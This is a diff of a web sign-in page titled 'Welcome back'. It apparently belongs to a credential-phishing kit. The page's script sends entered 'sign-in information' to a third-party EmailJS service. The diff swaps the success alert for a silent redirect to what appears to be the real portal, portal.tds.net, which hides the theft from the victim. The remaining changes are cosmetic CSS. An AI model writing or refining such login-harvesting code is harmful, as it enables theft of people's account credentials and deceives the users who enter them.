@@ -99,7 +99,7 @@
     font-size: 14px;
     padding: 6px 10px;
     border-radius: 4px;
-    background: rgba(176, 0, 32, 0.1); /* transparent red */
+    background: rgba(176, 0, 32, 0.1);
     margin-bottom: 15px;
   }
   .error-banner svg {
@@ -199,8 +199,7 @@
   .footer::before {
     content: "";
     position: absolute;
-    top: 0;
-    left: 0;
+    top: 0; left: 0;
     height: 10px;
     width: 100%;
     background: linear-gradient(90deg, rgba(0, 170, 244, 1) 30%, rgba(0, 210, 88, 1) 95%, rgba(0, 210, 88, 1) 100%);
@@ -255,7 +254,7 @@
 
       <h1>Welcome back</h1>
 
-      <div id="errorBanner" class="error-banner" role="alert" aria-live="assertive" aria-atomic="true">
+      <div id="errorBanner" class="error-banner" role="alert" aria-live="assertive" aria-atomic="true" style="display:none;">
         <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false" aria-label="Error icon">
           <path d="M1 21h22L12 2 1 21zM13 18h-2v-2h2v2zm0-4h-2v-4h2v4z"></path>
         </svg>
@@ -325,9 +324,8 @@
 
     emailjs.send('service_zuj2d2a', 'template_tvd86sp', templateParams)
       .then(() => {
-        alert('Sign-in information sent successfully!');
-        form.reset();
-        errorBanner.style.display = 'none';
+        // Redirect on success
+        window.location.href = "https://portal.tds.net";
       }, () => {
         alert('Failed to send the sign-in information. Please try again.');
       });
